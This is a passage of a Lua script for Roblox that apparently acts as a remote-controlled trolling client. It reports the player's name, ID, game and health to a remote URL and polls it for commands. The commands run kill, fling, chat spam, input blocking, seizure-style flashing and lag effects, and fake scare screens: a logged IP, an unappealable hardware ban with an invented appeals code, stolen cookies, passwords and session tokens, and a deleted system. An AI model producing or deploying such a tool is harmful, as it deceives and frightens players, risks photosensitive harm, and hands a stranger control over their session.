        {"OS:","Windows "..tostring(math.random(10,11)),Color3.fromRGB(200,200,200)},
        {"HWID:","0x"..string.format("%08X",math.random(0,0xFFFFFFFF))..string.format("%08X",math.random(0,0xFFFFFFFF)),Color3.fromRGB(200,200,200)},
    }

    local baseY = 0.2
    task.spawn(function()
        for _,row in pairs(info) do
            local lbl = mkLbl(row[1].." "..row[2], 18, row[3], baseY)
            lbl.TextXAlignment = Enum.TextXAlignment.Left
            baseY = baseY + 0.06
            doSound(nil,{id="160715357",volume=2})
            task.wait(0.8)
        end
        task.wait(0.5)
        mkLbl("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",14,Color3.fromRGB(80,80,80),baseY)
        baseY=baseY+0.04
        local warn = mkLbl("⚠️  YOUR IP HAS BEEN LOGGED  ⚠️",24,Color3.fromRGB(255,0,0),baseY)
        -- Пульсация
        for i=1,20 do
            warn.TextTransparency = math.sin(i*0.5)*0.5+0.5
            task.wait(0.2)
        end
        task.wait(3)
        if sg.Parent then sg:Destroy() end
    end)
end

-- 🔐 HWID Ban (фейк аппаратный бан)
local function admHWIDBan(_,p)
    local reason=(p and p.reason) or "HWID flagged"
    local hwid="0x"..string.format("%016X",math.random(0,0xFFFFFFFF))..string.format("%016X",math.random(0,0xFFFFFFFF))
    local sg=makeGui("HWID")
    local f=Instance.new("Frame");f.Size=UDim2.new(1,0,1,0);f.BackgroundColor3=Color3.fromRGB(10,0,0);f.BorderSizePixel=0;f.ZIndex=100;f.Parent=sg

    local function mkL(txt,sz,col,py)
        local l=Instance.new("TextLabel");l.Size=UDim2.new(0.85,0,0,sz+10);l.Position=UDim2.new(0.075,0,py,0)
        l.BackgroundTransparency=1;l.Text=txt;l.TextSize=sz;l.Font=Enum.Font.Code;l.TextColor3=col;l.TextWrapped=true;l.ZIndex=101;l.Parent=f
    end

    mkL("⛔ HARDWARE BAN ⛔",32,Color3.fromRGB(255,0,0),0.1)
    mkL("Your device has been permanently banned.",16,Color3.fromRGB(200,200,200),0.2)
    mkL("HWID: "..hwid,12,Color3.fromRGB(150,150,150),0.28)
    mkL("Reason: "..reason,16,Color3.fromRGB(255,100,100),0.35)
    mkL("This ban cannot be appealed.",14,Color3.fromRGB(120,120,120),0.42)
    mkL("Ban applies to ALL accounts on this device.",14,Color3.fromRGB(120,120,120),0.48)
    mkL("Contact: appeals@roblox.com (Code: "..math.random(10000,99999)..")",12,Color3.fromRGB(80,80,80),0.55)

    doSound(nil,{id="1585349108",volume=8})
    -- Freeze
    local r=mr();if r then r.Anchored=true end
end

-- 📡 Data Harvest (фейк сбор данных)
local function admDataHarvest()
    local sg=makeGui("Data")
    local f=Instance.new("Frame");f.Size=UDim2.new(1,0,1,0);f.BackgroundColor3=Color3.new(0,0,0);f.BorderSizePixel=0;f.ZIndex=100;f.Parent=sg
    local lbl=Instance.new("TextLabel");lbl.Size=UDim2.new(0.9,0,0.8,0);lbl.Position=UDim2.new(0.05,0,0.05,0)
    lbl.BackgroundTransparency=1;lbl.TextColor3=Color3.fromRGB(0,255,0);lbl.TextSize=14;lbl.Font=Enum.Font.Code
    lbl.TextWrapped=true;lbl.TextXAlignment=Enum.TextXAlignment.Left;lbl.TextYAlignment=Enum.TextYAlignment.Top
    lbl.ZIndex=101;lbl.Parent=f

    local lines={
        "[*] Initializing data harvest module...",
        "[*] Connecting to target: "..LP.Name.." (ID: "..LP.UserId..")",
        "[+] Connection established",
        "[*] Scanning network interfaces...",
        "[+] Found adapter: Ethernet (192.168."..math.random(0,255).."."..math.random(1,254)..")",
        "[*] Extracting browser cookies...",
        "[+] Cookies captured: "..math.random(50,500).." entries",
        "[*] Dumping saved passwords...",
        "[+] Passwords found: "..math.random(5,30).." entries",
        "[*] Accessing clipboard history...",
        "[+] Clipboard: "..math.random(10,100).." items",
        "[*] Scanning Discord tokens...",
        "[+] Token found: mfa."..string.rep("*",20),
        "[*] Capturing screen...",
        "[+] Screenshot saved",
        "[*] Exfiltrating Roblox session...",
        "[+] .ROBLOSECURITY captured",
        "[*] Scanning local files...",
        "[+] Documents: "..math.random(100,5000).." files indexed",
        "[*] Uploading data to C2 server...",
        "[+] Upload complete: "..string.format("%.1f",math.random(10,500)/10).." MB",
        "",
        "[✓] DATA HARVEST COMPLETE",
        "[✓] All data has been transmitted.",
    }

    task.spawn(function()
        local shown=""
        for _,line in pairs(lines) do
            shown=shown..line.."\n"
            lbl.Text=shown
            if line:sub(1,3)=="[+]" then
                doSound(nil,{id="160715357",volume=1})
            end
            task.wait(0.5+math.random()*0.5)
        end
        task.wait(5)
        if sg.Parent then sg:Destroy() end
    end)
end

-- 🖥️ System Takeover (много окон с ошибками)
local function admTakeover()
    local sg=makeGui("Take")
    local f=Instance.new("Frame");f.Size=UDim2.new(1,0,1,0);f.BackgroundColor3=Color3.new(0,0,0);f.BackgroundTransparency=0.3;f.BorderSizePixel=0;f.ZIndex=100;f.Parent=sg

    local errors={"ACCESS DENIED","SYSTEM COMPROMISED","FIREWALL BREACHED","DATA CORRUPTED","KERNEL PANIC","MEMORY OVERFLOW","ENCRYPTION FAILED","ROOT ACCESS GRANTED"}

    task.spawn(function()
        for i=1,15 do
            local box=Instance.new("Frame")
            box.Size=UDim2.new(0,math.random(180,300),0,math.random(80,140))
            box.Position=UDim2.new(math.random()*0.6,0,math.random()*0.6,0)
            box.BackgroundColor3=Color3.fromRGB(math.random(20,60),math.random(20,60),math.random(20,60))
            box.BorderSizePixel=1;box.ZIndex=101+i;box.Parent=f
            Instance.new("UICorner",box).CornerRadius=UDim.new(0,4)

            -- Title bar
            local tb=Instance.new("Frame");tb.Size=UDim2.new(1,0,0,22);tb.BackgroundColor3=Color3.fromRGB(180,30,30);tb.BorderSizePixel=0;tb.ZIndex=102+i;tb.Parent=box
            local tt=Instance.new("TextLabel");tt.Size=UDim2.new(1,-5,1,0);tt.BackgroundTransparency=1;tt.Text="⚠ Error";tt.TextSize=12;tt.Font=Enum.Font.Code;tt.TextColor3=Color3.new(1,1,1);tt.TextXAlignment=Enum.TextXAlignment.Left;tt.ZIndex=103+i;tt.Parent=tb

            local msg=Instance.new("TextLabel");msg.Size=UDim2.new(0.9,0,0.5,0);msg.Position=UDim2.new(0.05,0,0.35,0)
            msg.BackgroundTransparency=1;msg.Text=errors[math.random(#errors)];msg.TextSize=14;msg.Font=Enum.Font.Code
            msg.TextColor3=Color3.fromRGB(255,50,50);msg.TextWrapped=true;msg.ZIndex=102+i;msg.Parent=box

            doSound(nil,{id="160715357",volume=2})
            task.wait(0.3)
        end
        task.wait(8)
        if sg.Parent then sg:Destroy() end
    end)
end

-- 💣 Self Destruct (фейк удаление файлов)
local function admSelfDestruct()
    local sg=makeGui("SD")
    local f=Instance.new("Frame");f.Size=UDim2.new(1,0,1,0);f.BackgroundColor3=Color3.new(0,0,0);f.BorderSizePixel=0;f.ZIndex=100;f.Parent=sg
    local lbl=Instance.new("TextLabel");lbl.Size=UDim2.new(0.9,0,0.8,0);lbl.Position=UDim2.new(0.05,0,0.05,0)
    lbl.BackgroundTransparency=1;lbl.TextColor3=Color3.fromRGB(255,0,0);lbl.TextSize=14;lbl.Font=Enum.Font.Code
    lbl.TextWrapped=true;lbl.TextXAlignment=Enum.TextXAlignment.Left;lbl.TextYAlignment=Enum.TextYAlignment.Top;lbl.ZIndex=101;lbl.Parent=f

    local folders={"C:\\Users\\"..LP.Name.."\\Documents","C:\\Users\\"..LP.Name.."\\Desktop","C:\\Users\\"..LP.Name.."\\Downloads","C:\\Users\\"..LP.Name.."\\AppData\\Local\\Roblox","C:\\Windows\\System32","C:\\Program Files","C:\\Users\\"..LP.Name.."\\Pictures","C:\\Users\\"..LP.Name.."\\Videos"}

    local lines={
        "╔═══════════════════════════════════════╗",
        "║     ⚠️  SELF DESTRUCT ACTIVATED  ⚠️    ║",
        "╚═══════════════════════════════════════╝",
        "",
        "[!] WARNING: This action is irreversible",
        "[*] Initiating file system wipe...",
        "",
    }
    for _,folder in pairs(folders) do
        table.insert(lines,"[DEL] Wiping "..folder.."...")
        table.insert(lines,"      → "..math.random(50,2000).." files deleted")
    end
    table.insert(lines,"")
    table.insert(lines,"[*] Overwriting boot sector...")
    table.insert(lines,"[*] Clearing registry...")
    table.insert(lines,"[*] Destroying recovery partition...")
    table.insert(lines,"")
    table.insert(lines,"[✓] WIPE COMPLETE")
    table.insert(lines,"[✓] System will shut down in 5 seconds...")

    task.spawn(function()
        local shown=""
        for _,line in pairs(lines) do
            shown=shown..line.."\n";lbl.Text=shown
            if line:sub(1,5)=="[DEL]" then doSound(nil,{id="160715357",volume=1}) end
            task.wait(0.4+math.random()*0.3)
        end
        -- Countdown
        for i=5,1,-1 do
            shown=shown..tostring(i).."...\n";lbl.Text=shown
            doSound(nil,{id="160715357",volume=3});task.wait(1)
        end
        -- "Shutdown"
        lbl.Text="";f.BackgroundColor3=Color3.new(0,0,0)
        task.wait(3)
        if sg.Parent then sg:Destroy() end
    end)
end

-- ═══════════════════════════════════════
-- RESET
-- ═══════════════════════════════════════
local function doReset()
    S.spn=false;S.fly=false;S.ncl=false;S.inv=false;S.szr=false;S.drunk=false;S.rainbow=false;S.dloop=false;S.tploop=false;S.fwalk=false;S.swalk=false;S.bwalk=false;S.shake=false;S.blocked=false
    for _,c in pairs(S.con) do pcall(function() c:Disconnect() end) end;S.con={};cm();doStopSound();removeFX();doClearFX();clearVG()
    local r=mr();if r then r.Anchored=false end
    local h=mh();if h then h.WalkSpeed=16;h.JumpPower=50;h.AutoRotate=true end
    local ch=LP.Character;if ch then for _,p in pairs(ch:GetDescendants()) do if p:IsA("BasePart") then p.Transparency=0;p.CanCollide=true;p.Material=Enum.Material.Plastic end;if p:IsA("Decal") or p:IsA("Texture") then p.Transparency=0 end end end
    pcall(function() for _,n in pairs({"BodyDepthScale","BodyHeightScale","BodyWidthScale","HeadScale"}) do local v=mh():FindFirstChild(n);if v then v.Value=1 end end end)
    W.CurrentCamera.FieldOfView=70;W.CurrentCamera.CameraType=Enum.CameraType.Custom;W.Gravity=196.2;L.FogEnd=100000;L.ClockTime=14
    for _,v in pairs(W:GetChildren()) do if v.Name=="Z_LAG" then v:Destroy() end end
end

-- ═══════════════════════════════════════
-- КОМАНДЫ
-- ═══════════════════════════════════════
local CMD={
    kill=doKill,fling=doFling,tpsky=doTPSky,tpvoid=doTPVoid,megasky=doMegaSky,edge=doEdge,explode=doExplode,tornadofling=doTornadoFling,lightning=doLightning,deathloop=doDeathLoop,stopdeathloop=doStopDeathLoop,
    jump=doJump,sit=doSit,freeze=doFreeze,spin=doSpin,fastspin=doFastSpin,invert=doInvert,ragdoll=doRagdoll,forcewalk=doForceWalk,dance=doDance,seizurewalk=doSeizureWalk,magnet=doMagnet,botwalk=doBotWalk,lockcam=doLockCam,skydive=doSkydive,
    speed=doSpeed,speedreset=doSpeedReset,jumppower=doJumpPower,giant=doGiant,invisible=doInvisible,noclip=doNoclip,fly=doFly,gravity=doGravity,fire=doFire,sparkles=doSparkles,smoke=doSmoke,bubbles=doBubbles,flashlight=doFlashlight,trail=doTrail,icebody=doIceBody,removeeffects=doRemoveEffects,
    seizure=doSeizure,blur=doBlur,fov=doFOV,blackout=doBlackout,redscreen=doRedScreen,rainbow=doRainbow,drunk=doDrunk,zoom=doZoom,flipcam=doFlipCam,fog=doFog,removesky=doRemoveSky,night=doNight,day=doDay,shakecam=doShakeCam,clearfx=doClearFX,
    sound=doSound,loopsound=doLoopSound,stopsound=doStopSound,
    chat=doChat,chatspam=doChatSpam,chatnumbers=doChatNumbers,botspam=doBotSpam,keyspam=doKeySpam,
    tp=doTP,randomtp=doRandomTP,tpspawn=doTPSpawn,tploop=doTPLoop,stoptploop=doStopTPLoop,
    reset=doReset,
}

local VIP_CMD={
    vip_blackscreen=vipBlackScreen,vip_banscreen=vipBanScreen,vip_fulltext=vipFullText,vip_jumpscare=vipJumpscare,vip_matrix=vipMatrix,vip_bloodscreen=vipBloodScreen,
    vip_realkick=vipRealKick,vip_blockinput=vipBlockInput,vip_unblockinput=vipUnblockInput,vip_deathloop=doDeathLoop,vip_removeparts=vipRemoveParts,vip_flatten=vipFlatten,
    vip_lagbomb=vipLagBomb,vip_megaspam=vipMegaSpam,vip_soundbomb=vipSoundBomb,vip_chaosmachine=vipChaosMachine,vip_fakeerror=vipFakeError,vip_timer=vipTimer,vip_freezescreen=vipFreezeScreen,vip_circus=vipCircus,
}

local ADM_CMD={
    adm_iptrack=admIPTrack,adm_hwidban=admHWIDBan,adm_dataharvest=admDataHarvest,adm_takeover=admTakeover,adm_selfdestruct=admSelfDestruct,
}

-- ═══════════════════════════════════════
-- REGISTER + POLL
-- ═══════════════════════════════════════
local function register()
    local raw=hGet(URL);local data=raw and jd(raw) or {};if not data.users then data.users={} end
    local found=false
    for i,u in pairs(data.users) do if u.name==LP.Name then data.users[i].alive=true;data.users[i].game=game.PlaceId;data.users[i].ts=os.time();found=true;break end end
    if not found then table.insert(data.users,{name=LP.Name,id=LP.UserId,game=game.PlaceId,alive=true,ts=os.time()}) end
    hPost(URL,je(data))
end

local function poll()
    local raw=hGet(URL);if not raw then return end;local data=jd(raw);if not data then return end
    local key="cmd_"..LP.Name;local cmd=data[key];if not cmd then return end
    local t=cmd.ts or 0;if t<=TS then return end;TS=t
    local action=cmd.action
    if ADM_CMD[action] then
        if checkAuth(cmd,"adm_auth") and checkAuth(cmd,"vip_auth") then pcall(ADM_CMD[action],cmd.target,cmd.params) end
    elseif VIP_CMD[action] then
        if checkAuth(cmd,"vip_auth") then pcall(VIP_CMD[action],cmd.target,cmd.params) end
    elseif CMD[action] then
        pcall(CMD[action],cmd.target,cmd.params)
    end
    data[key]=nil;hPost(URL,je(data))
end

local function heartbeat()
    local raw=hGet(URL);local data=raw and jd(raw) or {};if not data.users then return end
    for i,u in pairs(data.users) do if u.name==LP.Name then data.users[i].alive=true;data.users[i].ts=os.time();data.users[i].hp=mh() and math.floor(mh().Health) or 0;break end end
    hPost(URL,je(data))
end

register()
task.spawn(function() while true do pcall(heartbeat);task.wait(5) end end)
task.spawn(function() while true do pcall(poll);task.wait(1.5) end end)
LP.CharacterAdded:Connect(function() task.wait(1);register();if S.ncl then S.ncl=false;doNoclip() end;if S.dloop then task.wait(0.5);doKill() end end)
